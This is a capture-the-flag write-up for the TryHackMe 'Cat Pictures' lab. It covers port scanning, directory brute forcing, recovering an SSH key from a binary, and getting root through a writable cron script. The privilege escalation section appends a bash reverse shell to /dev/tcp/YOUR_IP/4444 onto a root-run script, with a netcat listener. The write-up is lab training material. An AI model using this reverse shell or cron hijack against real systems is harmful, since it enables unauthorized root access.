Cat Pictures – TryHackMe Writeup
Overview
This machine covers core penetration testing concepts including enumeration, binary analysis, SSH key extraction, and privilege escalation through a misconfigured cron job.

Initial Enumeration
Nmap Scan
sudo nmap -Pn -p- -sS 10.114.163.8
Result (example)
22/tcp   open  ssh
8080/tcp open  http-proxy
Note: Some writeups mention FTP (port 21), but it was not available in this instance.

Web Enumeration (Port 8080)
Access the web application:

http://10.114.163.8:8080
Perform directory brute forcing:

gobuster dir -u http://10.114.163.8:8080 -w /usr/share/wordlists/dirb/common.txt
Identify and download the binary file named runme.

Binary Analysis
Analyze the binary:

file runme
strings runme
Execute it:

chmod +x runme
./runme
After entering the correct password, the program generates a private SSH key:

id_rsa
SSH Access
Extract the Key
cat id_rsa
Copy the output and save it locally:

nano id_rsa
Fix Permissions
chmod 600 id_rsa
Connect via SSH
ssh -i id_rsa catlover@10.114.163.8
Privilege Escalation
Inspect Command History
cat ~/.bash_history
Relevant entries:

cat /opt/clean/clean.sh
cat /etc/crontab
Analyze the Script
cat /opt/clean/clean.sh
Content:

#!/bin/bash
rm -rf /tmp/*
Check Cron Configuration
cat /etc/crontab
Example entry:

* * * * * root /opt/clean/clean.sh
This indicates the script is executed every minute as root.

Exploit Writable Script
Start a listener:

nc -lvnp 4444
Append a reverse shell:

echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" >> /opt/clean/clean.sh
Replace YOUR_IP with your VPN IP (tun0).

Gain Root Shell
Wait approximately one minute for the cron job to execute.

Once connected:

whoami
Expected output:

root
Root Flag
cat /root/root.txt

Key Takeaways -

1. Always rely on your own enumeration instead of strictly following writeups

2. Service availability may differ between instances

3. Writable cron jobs are a critical privilege escalation vector

4. Proper SSH key handling is essential for successful authentication

Common Pitfalls -

1. Using the IP address from a writeup instead of your assigned target

2. Forgetting to set correct permissions on the SSH key

3. Not starting a listener before triggering the reverse shell

4. Assuming all services mentioned in writeups will be present
